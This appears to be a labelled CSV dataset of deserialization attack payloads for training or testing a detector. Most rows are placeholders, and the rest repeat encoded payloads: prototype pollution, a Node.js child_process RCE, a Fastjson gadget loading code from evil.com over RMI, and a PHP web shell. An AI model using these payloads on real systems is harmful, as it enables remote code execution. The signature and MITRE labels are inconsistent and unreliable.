Payload,Signature,AttackType,Severity,MITRE,Label,Description
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
BVNlcmlhbGl6YWJsZSBkYXRhIGhlcmU%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
aced0005737200116a6176612e7574696c2e48617368536574,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"{""__proto__"":{""isAdmin"":true}}",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""__proto__""%3A%7B""isAdmin""%3Atrue%7D%7D",BruteForce,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""rce""%3A""_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%5C""child_process%5C""%29.exec%28%5C""calc%5C""%2C function%28%29%7B%7D%29%3B%7D%28%29""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
pickle_data_with_malicious_payload,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%24type""%3A""System.Windows.Data.ObjectDataProvider%2C PresentationFramework""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%40type""%3A""com.sun.rowset.JdbcRowSetImpl""%2C""dataSourceName""%3A""rmi%3A//evil.com%3A1099/Exploit""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"O%3A8%3A""stdClass""%3A1%3A%7Bs%3A4%3A""data""%3Bs%3A22%3A""<%3Fphp system%28%24_GET%5Bcmd%5D%29%3B %3F>""%3B%7D",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
H4sIAAAAAAAAAKtWyk5NzCvJzE21UkoD8ZNSFKyVrJSSknNyOa3TlJI%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"php system($_GET[cmd]); ?>"";}",CMDi,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%24type""%3A""System.Windows.Data.ObjectDataProvider%2C PresentationFramework""%7D",COMMAND_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"%7B""%40type""%3A""com.sun.rowset.JdbcRowSetImpl""%2C""dataSourceName""%3A""rmi%3A//evil.com%3A1099/Exploit""%7D",COMMAND_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"%7B""__proto__""%3A%7B""isAdmin""%3Atrue%7D%7D",GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"%7B""rce""%3A""_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%5C""child_process%5C""%29.exec%28%5C""calc%5C""%2C function%28%29%7B%7D%29%3B%7D%28%29""%7D",GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
BVNlcmlhbGl6YWJsZSBkYXRhIGhlcmU%3D,GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
H4sIAAAAAAAAAKtWyk5NzCvJzE21UkoD8ZNSFKyVrJSSknNyOa3TlJI%3D,GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"O%3A8%3A""stdClass""%3A1%3A%7Bs%3A4%3A""data""%3Bs%3A22%3A""<%3Fphp system%28%24_GET%5Bcmd%5D%29%3B %3F>""%3B%7D",GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
aced0005737200116a6176612e7574696c2e48617368536574,GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"php system($_GET[cmd]); ?>"";}",GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
pickle_data_with_malicious_payload,GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA%3D,GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
"{""__proto__"":{""isAdmin"":true}}",GENERIC_INJECTION,Deserialization,Medium,T1190,Malicious,Deserialization attack attempt
BVNlcmlhbGl6YWJsZSBkYXRhIGhlcmU%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
aced0005737200116a6176612e7574696c2e48617368536574,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"{""__proto__"":{""isAdmin"":true}}",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""__proto__""%3A%7B""isAdmin""%3Atrue%7D%7D",BruteForce,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""rce""%3A""_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%5C""child_process%5C""%29.exec%28%5C""calc%5C""%2C function%28%29%7B%7D%29%3B%7D%28%29""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
pickle_data_with_malicious_payload,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%24type""%3A""System.Windows.Data.ObjectDataProvider%2C PresentationFramework""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%40type""%3A""com.sun.rowset.JdbcRowSetImpl""%2C""dataSourceName""%3A""rmi%3A//evil.com%3A1099/Exploit""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"O%3A8%3A""stdClass""%3A1%3A%7Bs%3A4%3A""data""%3Bs%3A22%3A""<%3Fphp system%28%24_GET%5Bcmd%5D%29%3B %3F>""%3B%7D",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
H4sIAAAAAAAAAKtWyk5NzCvJzE21UkoD8ZNSFKyVrJSSknNyOa3TlJI%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"php system($_GET[cmd]); ?>"";}",CMDi,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%24type""%3A""System.Windows.Data.ObjectDataProvider%2C PresentationFramework""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%40type""%3A""com.sun.rowset.JdbcRowSetImpl""%2C""dataSourceName""%3A""rmi%3A//evil.com%3A1099/Exploit""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""__proto__""%3A%7B""isAdmin""%3Atrue%7D%7D",BruteForce,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""rce""%3A""_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%5C""child_process%5C""%29.exec%28%5C""calc%5C""%2C function%28%29%7B%7D%29%3B%7D%28%29""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
BVNlcmlhbGl6YWJsZSBkYXRhIGhlcmU%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
H4sIAAAAAAAAAKtWyk5NzCvJzE21UkoD8ZNSFKyVrJSSknNyOa3TlJI%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"O%3A8%3A""stdClass""%3A1%3A%7Bs%3A4%3A""data""%3Bs%3A22%3A""<%3Fphp system%28%24_GET%5Bcmd%5D%29%3B %3F>""%3B%7D",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
aced0005737200116a6176612e7574696c2e48617368536574,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"php system($_GET[cmd]); ?>"";}",CMDi,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
pickle_data_with_malicious_payload,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"{""__proto__"":{""isAdmin"":true}}",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
BVNlcmlhbGl6YWJsZSBkYXRhIGhlcmU%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
aced0005737200116a6176612e7574696c2e48617368536574,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"{""__proto__"":{""isAdmin"":true}}",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""__proto__""%3A%7B""isAdmin""%3Atrue%7D%7D",BruteForce,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""rce""%3A""_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%5C""child_process%5C""%29.exec%28%5C""calc%5C""%2C function%28%29%7B%7D%29%3B%7D%28%29""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
pickle_data_with_malicious_payload,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%24type""%3A""System.Windows.Data.ObjectDataProvider%2C PresentationFramework""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"%7B""%40type""%3A""com.sun.rowset.JdbcRowSetImpl""%2C""dataSourceName""%3A""rmi%3A//evil.com%3A1099/Exploit""%7D",Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"O%3A8%3A""stdClass""%3A1%3A%7Bs%3A4%3A""data""%3Bs%3A22%3A""<%3Fphp system%28%24_GET%5Bcmd%5D%29%3B %3F>""%3B%7D",SSTI,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
H4sIAAAAAAAAAKtWyk5NzCvJzE21UkoD8ZNSFKyVrJSSknNyOa3TlJI%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA%3D,Unknown,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
"php system($_GET[cmd]); ?>"";}",CMDi,Deserialization,Medium,T1559,Malicious,Deserialization attack attempt
